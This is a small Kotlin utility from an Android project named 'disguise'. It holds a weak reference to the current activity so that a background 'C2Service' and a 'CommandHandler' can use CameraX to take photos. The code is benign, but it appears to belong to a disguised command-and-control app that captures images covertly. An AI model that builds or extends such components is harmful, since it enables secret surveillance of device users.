package com.example.disguise.util

import android.app.Activity
import java.lang.ref.WeakReference

/**
 * ActivityTracker — يتتبع واجهة التطبيق الحالية (MainActivity).
 *
 * المسار: app/src/main/java/com/example/disguise/util/ActivityTracker.kt
 *
 * لماذا نحتاجه؟
 * - CameraX (لالتقاط الصور) يحتاج إلى Activity (LifecycleOwner) ليعمل.
 * - خدمة الخلفية (C2Service) لا تستطيع الوصول للواجهة مباشرة، لذا نحفظ مرجعاً ضعيفاً (WeakReference) لها.
 */
object ActivityTracker {
    private var currentActivityRef: WeakReference<Activity>? = null

    // يُستدعى من MainActivity.onResume()
    fun setCurrentActivity(activity: Activity) {
        currentActivityRef = WeakReference(activity)
    }

    // يُستدعى من MainActivity.onPause()
    fun clearCurrentActivity() {
        currentActivityRef?.clear()
        currentActivityRef = null
    }

    // يُستدعى من CommandHandler لجلب الواجهة
    val currentActivity: Activity?
        get() = currentActivityRef?.get()
}
